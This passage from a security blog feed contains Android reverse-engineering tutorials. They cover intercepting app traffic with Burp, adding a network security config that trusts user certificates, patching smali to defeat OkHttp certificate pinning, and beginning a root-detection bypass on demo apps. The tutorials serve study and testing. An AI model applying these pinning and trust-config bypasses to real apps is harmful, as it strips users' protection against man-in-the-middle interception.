href="https://github.com/iddoeldor/frida-snippets#class-description">frida-snippets</a></li><li><a href="https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/frida-tutorial">Frida Tutorial</a></li><li><a href="https://www.anquanke.com/post/id/197657">Practical FRIDA Advanced: Memory Roaming, Hook Anywhere, Packet Capture</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;In the previous articles, we talked about static analysis, which means we didn’t actually run the app. Instead, we studied the logic of the app’s operation through decompiled code and modified the code before repackaging and executing it.&lt;/p&gt;
&lt;p&gt;Dynamic analysis, on the other hand, means that we will run the app and use various methods to hook various methods to monitor the input and output of certain methods, and even tamper with them.&lt;/p&gt;
&lt;p&gt;In this article, let’s learn how to use Frida for dynamic analysis.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Android App Reverse Engineering Part 3: Monitoring App Packets</title>
    <link href="https://blog.huli.tw/2023/04/27/en/android-apk-decompile-intro-3/"/>
    <id>https://blog.huli.tw/2023/04/27/en/android-apk-decompile-intro-3/</id>
    <published>2023-04-27T06:20:44.000Z</published>
    <updated>2023-06-20T05:10:49.040Z</updated>
    
    <content type="html"><![CDATA[<p>I remember when I first started working with Android, it was easy to see which requests an app was sending. All I had to do was install <a href="https://www.charlesproxy.com/">Charles</a> on my computer, set up the Wi-Fi on my phone to proxy to my computer, and then download the certificate provided by Charles by entering a specific URL. Once installed, I was good to go.</p><p>However, when I tried the same process recently, I could see some packets being sent, but the traffic coming out of the app was empty. I searched online for various solutions, but none of them worked.</p><p>Finally, I found out that Android changed its security settings above 6.0, and by default, it does not trust certificates installed by users, which is why it cannot intercept them. One solution is to install a local VPN, which will route all traffic through the proxy, but I found it a bit cumbersome after trying it out.</p><p>Among the many methods, the most useful one I tried was to unpack the apk, modify some settings, and then repack it. This article will document the process and experience.</p><span id="more"></span><p>Series links:</p><ol><li><a href="/2023/04/27/en/android-apk-decompile-intro-1/">Android App Reverse Engineering Part 1: Unpacking and Rebuilding Apks</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-2/">Android App Reverse Engineering Part 2: Modifying Smali Code</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-3/">Android App Reverse Engineering Part 3: Monitoring App Packets</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-4/">Android App Reverse Engineering Part 4: Dynamic Analysis with Frida</a></li></ol><h2><span id="prerequisites">Prerequisites</span></h2><p>There are two prerequisites:</p><ol><li>Prepare a proxy</li><li>Set up the phone</li></ol><p>Any proxy can be used for the proxy part. I used the common <a href="https://portswigger.net/burp">Burp Suite</a>, and the settings for other software should be similar.</p><p>First, go to Proxy -&gt; Options to add Proxy Listeners, and remember to select all interfaces for the bind to address so that the phone can connect:</p><p><img src="/img/android-apk-decompile-intro/p7-proxy.png"></p><p>The computer’s proxy is now set up, and we can move on to setting up the phone.</p><p>Before starting the setup, make sure that the phone and computer are connected to the same Wi-Fi network. Then, check the internal IP address of the computer and go to Settings &#x3D;&gt; Connections &#x3D;&gt; Wi-Fi on the phone to edit the connected network and set up a manual proxy to route the phone’s traffic to the computer.</p><p>Next, we need to install Burp Suite’s certificate on the phone. Simply visit <code>http://burpsuite</code> on the phone, and a file called <code>cert.der</code> will be downloaded. Remember to rename it to <code>cert.cer</code> and then install the certificate.</p><p>At this point, the phone is ready.</p><h2><span id="modifying-the-apk">Modifying the Apk</span></h2><p>The apk used for this demonstration can be found here: <a href="https://github.com/aszx87410/demo/raw/master/android/demoapp-http.apk">https://github.com/aszx87410/demo/raw/master/android/demoapp-http.apk</a></p><p>The content of the app is simple: pressing a button sends a request, and if it is intercepted, it means that it was successful. After installing the app, you can try it out. You should find that even though all the settings are in place, the proxy is still empty.</p><p>As I mentioned at the beginning, there is a section in the Android official documentation that explains this: <a href="https://developer.android.com/training/articles/security-config">Network security configuration</a></p><p>The modification method is also simple and basically does not require any changes to the code. Therefore, we first use Apktool to unpack the apk.</p><p>Next, open AndroidManifest.xml and find <code>&lt;application&gt;</code>. Check if it has the attribute <code>android:networkSecurityConfig</code>. If it does not, add it: <code>android:networkSecurityConfig=&quot;@xml/network_security_config&quot;</code>. If it does, remember the name of the xml.</p><p>Then, go to res&#x2F;xml and add <code>network_security_config.xml</code>, with the following content:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>network-security-config</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base-config</span> <span class="token attr-name">cleartextTrafficPermitted</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>trust-anchors</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>certificates</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>system<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>certificates</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>trust-anchors</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base-config</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>network-security-config</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This file represents that the app trusts all certificates, including those installed by the user. If the app already has this file, you can replace the contents with the above to ensure that the app trusts user certificates.</p><p>Then repack the apk and click the button again to see if you can intercept the traffic from the proxy:</p><p><img src="/img/android-apk-decompile-intro/p8-success.png"></p><h2><span id="certificate-pinning">Certificate pinning</span></h2><p>If the proxy still cannot listen after the above steps, it means that the app may have other security settings, such as certificate pinning.</p><p>What is certificate pinning? If a webpage uses https, it means that the server has an https certificate, and certificate pinning means that the app specifies what certificate should correspond to a certain domain. If the certificate does not match, it means that someone is messing with it in the middle, so the connection is rejected.</p><p>Taking the popular library OkHttp as an example, the <a href="https://square.github.io/okhttp/4.x/okhttp/okhttp3/-certificate-pinner/">document</a> writes how to implement this feature:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> hostname <span class="token operator">=</span> <span class="token string">"publicobject.com"</span><span class="token punctuation">;</span><span class="token class-name">CertificatePinner</span> certificatePinner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CertificatePinner<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> <span class="token string">"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">OkHttpClient</span> client <span class="token operator">=</span> <span class="token class-name">OkHttpClient<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">certificatePinner</span><span class="token punctuation">(</span>certificatePinner<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Request</span> request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"https://"</span> <span class="token operator">+</span> hostname<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>client<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If you want to try it out, you can use this apk file: <a href="https://github.com/aszx87410/demo/raw/master/android/demoapp-pinning.apk">https://github.com/aszx87410/demo/raw/master/android/demoapp-pinning.apk</a></p><p>We still use apktool to unpack it, then put the network security config in as before, and then find where the code uses certificate pinner.</p><p>Because the code has turned on proguard this time, even okhttp has been obfuscated, and searching for the keyword <code>certificatePinner</code> may not find anything. What should we do? We can try another way. When using this feature, you must write a set of sha256 values in it, so we can search for: <code>sha256/</code></p><p>We can find such a paragraph:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"># virtual methods<span class="token punctuation">.</span>method <span class="token keyword">public</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token punctuation">.</span>locals <span class="token number">13</span>    <span class="token punctuation">.</span>line <span class="token number">1</span>    <span class="token keyword">new</span><span class="token operator">-</span>instance v0<span class="token punctuation">,</span> <span class="token class-name">Ljava</span><span class="token operator">/</span>util<span class="token operator">/</span><span class="token class-name">ArrayList</span><span class="token punctuation">;</span>    invoke<span class="token operator">-</span>direct <span class="token punctuation">&#123;</span>v0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Ljava</span><span class="token operator">/</span>util<span class="token operator">/</span><span class="token class-name">ArrayList</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span><span class="token operator">-</span>string v1<span class="token punctuation">,</span> <span class="token string">"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="</span>    <span class="token punctuation">.</span>line <span class="token number">2</span>    filled<span class="token operator">-</span><span class="token keyword">new</span><span class="token operator">-</span>array <span class="token punctuation">&#123;</span>v1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span>    move<span class="token operator">-</span>result<span class="token operator">-</span>object v1    <span class="token keyword">const</span><span class="token operator">-</span>string v2<span class="token punctuation">,</span> <span class="token string">"archive.org"</span>    <span class="token keyword">const</span><span class="token operator">-</span>string v3<span class="token punctuation">,</span> <span class="token string">"pattern"</span>    <span class="token punctuation">.</span>line <span class="token number">3</span>    invoke<span class="token operator">-</span><span class="token keyword">static</span> <span class="token punctuation">&#123;</span>v2<span class="token punctuation">,</span> v3<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lc</span><span class="token operator">/</span>j<span class="token operator">/</span>b<span class="token operator">/</span>d<span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">d</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span><span class="token operator">-</span>string v3<span class="token punctuation">,</span> <span class="token string">"pins"</span>    invoke<span class="token operator">-</span><span class="token keyword">static</span> <span class="token punctuation">&#123;</span>v1<span class="token punctuation">,</span> v3<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lc</span><span class="token operator">/</span>j<span class="token operator">/</span>b<span class="token operator">/</span>d<span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">d</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> v3<span class="token punctuation">,</span> <span class="token number">0x0</span>    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> v4<span class="token punctuation">,</span> <span class="token number">0x0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>What should we do after finding it? Do we need to change smali and remove certificate pinner? In fact, there is a simpler way.</p><p>From the code, we can guess that the <code>archive.org</code> below should be the bound domain, so as long as we change this domain to any other string, other domains will not check whether the certificate matches.</p><p>After changing it, repack the app and install it, and you can listen to the traffic normally.</p><p>Like the above, changing where certificatePinner is used, there is another way to directly change the implementation of okhttp. Find <code>okhttp3/CertificatePinner$Builder.smali</code> in smali, and there is a function:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"># virtual methods<span class="token punctuation">.</span>method <span class="token keyword">public</span> varargs <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Lokhttp3</span><span class="token operator">/</span><span class="token class-name">CertificatePinner</span>$<span class="token class-name">Builder</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span>locals <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>This is the method that okhttp uses to handle adding certificate pinner. We just need to change it like this:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"># virtual methods<span class="token punctuation">.</span>method <span class="token keyword">public</span> varargs <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Lokhttp3</span><span class="token operator">/</span><span class="token class-name">CertificatePinner</span>$<span class="token class-name">Builder</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span>locals <span class="token number">5</span>    # patch    <span class="token keyword">const</span><span class="token operator">-</span>string p1<span class="token punctuation">,</span> <span class="token string">"abc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>So the first parameter (domain) will always be abc and will never take effect.</p><h2><span id="summary">Summary</span></h2><p>In this article, we learned how to modify the app ourselves and remove some anti-man-in-the-middle attack mechanisms, such as changing the network security config and the part of the code that handles certificate pinning.</p><p>For general apps, this should be enough, at least to monitor traffic and see what the app is sending. And compared to the VPN solution, there is another advantage, that is, it can be repackaged twice, and a version that can work by replacing the API address can be produced, with higher flexibility.</p><p>In the next article, we will learn another way to analyze apps.</p><p>Series link:</p><ol><li><a href="/2023/04/27/en/android-apk-decompile-intro-1/">Android App Reverse Engineering Part 1: Disassembling and Reassembling APKs</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-2/">Android App Reverse Engineering Part 2: Modifying Smali Code</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-3/">Android App Reverse Engineering Part 3: Intercepting App Packets</a> - You are here</li><li><a href="/2023/04/27/en/android-apk-decompile-intro-4/">Android App Reverse Engineering Part 4: Dynamic Analysis with Frida</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;I remember when I first started working with Android, it was easy to see which requests an app was sending. All I had to do was install &lt;a href=&quot;https://www.charlesproxy.com/&quot;&gt;Charles&lt;/a&gt; on my computer, set up the Wi-Fi on my phone to proxy to my computer, and then download the certificate provided by Charles by entering a specific URL. Once installed, I was good to go.&lt;/p&gt;
&lt;p&gt;However, when I tried the same process recently, I could see some packets being sent, but the traffic coming out of the app was empty. I searched online for various solutions, but none of them worked.&lt;/p&gt;
&lt;p&gt;Finally, I found out that Android changed its security settings above 6.0, and by default, it does not trust certificates installed by users, which is why it cannot intercept them. One solution is to install a local VPN, which will route all traffic through the proxy, but I found it a bit cumbersome after trying it out.&lt;/p&gt;
&lt;p&gt;Among the many methods, the most useful one I tried was to unpack the apk, modify some settings, and then repack it. This article will document the process and experience.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Android App Reverse Engineering Part 2: Modifying Smali Code</title>
    <link href="https://blog.huli.tw/2023/04/27/en/android-apk-decompile-intro-2/"/>
    <id>https://blog.huli.tw/2023/04/27/en/android-apk-decompile-intro-2/</id>
    <published>2023-04-27T06:12:44.000Z</published>
    <updated>2023-06-20T05:10:49.040Z</updated>
    
    <content type="html"><![CDATA[<p>In the first part, we learned the basics of using Apktool to decompile an APK, modify its resources, reassemble it, and install the aligned and signed APK on a device.</p><p>In this part, we will learn how to modify the code.</p><p>Our goal is to bypass the root detection check on a rooted device and make the app display that it is not rooted. If you are testing on a non-rooted device, you can do the opposite and modify the app to detect that you have root access.</p><span id="more"></span><p>Series links:</p><ol><li><a href="/2023/04/27/en/android-apk-decompile-intro-1/">Android App Reverse Engineering Part 1: Decompiling and Recompiling APKs</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-2/">Android App Reverse Engineering Part 2: Modifying Smali Code</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-3/">Android App Reverse Engineering Part 3: Intercepting App Traffic</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-4/">Android App Reverse Engineering Part 4: Dynamic Analysis with Frida</a></li></ol><h2><span id="what-is-smali">What is Smali</span></h2><p>In the content we decompiled using <code>apktool d</code>, there is a folder called <code>smali</code>, which contains the code that was decompiled from <code>classes.dex</code>. However, this code may not look like what you expect. For example, let’s take a look at <code>smali/com/cymetrics/demo/MainActivity.smali</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token keyword">public</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>cymetrics<span class="token operator">/</span>demo<span class="token operator">/</span><span class="token class-name">MainActivity</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token keyword">super</span> <span class="token class-name">Landroidx</span><span class="token operator">/</span>appcompat<span class="token operator">/</span>app<span class="token operator">/</span><span class="token class-name">AppCompatActivity</span><span class="token punctuation">;</span><span class="token punctuation">.</span>source <span class="token string">"MainActivity.java"</span># direct methods<span class="token punctuation">.</span>method <span class="token keyword">public</span> constructor <span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token punctuation">.</span>locals <span class="token number">0</span>    <span class="token punctuation">.</span>line <span class="token number">16</span>    invoke<span class="token operator">-</span>direct <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroidx</span><span class="token operator">/</span>appcompat<span class="token operator">/</span>app<span class="token operator">/</span><span class="token class-name">AppCompatActivity</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">return</span><span class="token operator">-</span><span class="token keyword">void</span><span class="token punctuation">.</span>end method# virtual methods<span class="token punctuation">.</span>method <span class="token keyword">protected</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Landroid</span><span class="token operator">/</span>os<span class="token operator">/</span><span class="token class-name">Bundle</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token punctuation">.</span>locals <span class="token number">1</span>    <span class="token punctuation">.</span>line <span class="token number">20</span>    invoke<span class="token operator">-</span><span class="token keyword">super</span> <span class="token punctuation">&#123;</span>p0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroidx</span><span class="token operator">/</span>appcompat<span class="token operator">/</span>app<span class="token operator">/</span><span class="token class-name">AppCompatActivity</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Landroid</span><span class="token operator">/</span>os<span class="token operator">/</span><span class="token class-name">Bundle</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span> p1<span class="token punctuation">,</span> <span class="token number">0x7f0b001c</span>    <span class="token punctuation">.</span>line <span class="token number">21</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>cymetrics<span class="token operator">/</span>demo<span class="token operator">/</span><span class="token class-name">MainActivity</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">I</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span> p1<span class="token punctuation">,</span> <span class="token number">0x7f080122</span>    <span class="token punctuation">.</span>line <span class="token number">22</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>cymetrics<span class="token operator">/</span>demo<span class="token operator">/</span><span class="token class-name">MainActivity</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">I</span><span class="token punctuation">)</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">View</span><span class="token punctuation">;</span>    move<span class="token operator">-</span>result<span class="token operator">-</span>object p1    check<span class="token operator">-</span>cast p1<span class="token punctuation">,</span> <span class="token class-name">Landroidx</span><span class="token operator">/</span>appcompat<span class="token operator">/</span>widget<span class="token operator">/</span><span class="token class-name">Toolbar</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span>line <span class="token number">23</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>cymetrics<span class="token operator">/</span>demo<span class="token operator">/</span><span class="token class-name">MainActivity</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">setSupportActionBar</span><span class="token punctuation">(</span><span class="token class-name">Landroidx</span><span class="token operator">/</span>appcompat<span class="token operator">/</span>widget<span class="token operator">/</span><span class="token class-name">Toolbar</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span> p1<span class="token punctuation">,</span> <span class="token number">0x7f08007a</span>    <span class="token punctuation">.</span>line <span class="token number">25</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>cymetrics<span class="token operator">/</span>demo<span class="token operator">/</span><span class="token class-name">MainActivity</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">I</span><span class="token punctuation">)</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">View</span><span class="token punctuation">;</span>    move<span class="token operator">-</span>result<span class="token operator">-</span>object p1    check<span class="token operator">-</span>cast p1<span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>google<span class="token operator">/</span>android<span class="token operator">/</span>material<span class="token operator">/</span>floatingactionbutton<span class="token operator">/</span><span class="token class-name">FloatingActionButton</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span>line <span class="token number">26</span>    <span class="token keyword">new</span><span class="token operator">-</span>instance v0<span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>cymetrics<span class="token operator">/</span>demo<span class="token operator">/</span><span class="token class-name">MainActivity</span>$<span class="token number">1</span><span class="token punctuation">;</span>    invoke<span class="token operator">-</span>direct <span class="token punctuation">&#123;</span>v0<span class="token punctuation">,</span> p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>cymetrics<span class="token operator">/</span>demo<span class="token operator">/</span><span class="token class-name">MainActivity</span>$<span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">Lcom</span><span class="token operator">/</span>cymetrics<span class="token operator">/</span>demo<span class="token operator">/</span><span class="token class-name">MainActivity</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p1<span class="token punctuation">,</span> v0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>google<span class="token operator">/</span>android<span class="token operator">/</span>material<span class="token operator">/</span>floatingactionbutton<span class="token operator">/</span><span class="token class-name">FloatingActionButton</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">View</span>$<span class="token class-name">OnClickListener</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">return</span><span class="token operator">-</span><span class="token keyword">void</span><span class="token punctuation">.</span>end method<span class="token punctuation">.</span>method <span class="token keyword">public</span> <span class="token function">onCreateOptionsMenu</span><span class="token punctuation">(</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">Menu</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    <span class="token punctuation">.</span>locals <span class="token number">2</span>    <span class="token punctuation">.</span>line <span class="token number">38</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>cymetrics<span class="token operator">/</span>demo<span class="token operator">/</span><span class="token class-name">MainActivity</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">getMenuInflater</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">MenuInflater</span><span class="token punctuation">;</span>    move<span class="token operator">-</span>result<span class="token operator">-</span>object v0    <span class="token keyword">const</span><span class="token operator">/</span>high16 v1<span class="token punctuation">,</span> <span class="token number">0x7f0c0000</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>v0<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">MenuInflater</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">inflate</span><span class="token punctuation">(</span><span class="token class-name">ILandroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">Menu</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> p1<span class="token punctuation">,</span> <span class="token number">0x1</span>    <span class="token keyword">return</span> p1<span class="token punctuation">.</span>end method<span class="token punctuation">.</span>method <span class="token keyword">public</span> <span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">MenuItem</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    <span class="token punctuation">.</span>locals <span class="token number">2</span>    <span class="token punctuation">.</span>line <span class="token number">47</span>    invoke<span class="token operator">-</span><span class="token keyword">interface</span> <span class="token punctuation">&#123;</span>p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">MenuItem</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">getItemId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">I</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">const</span> v1<span class="token punctuation">,</span> <span class="token number">0x7f08003f</span>    <span 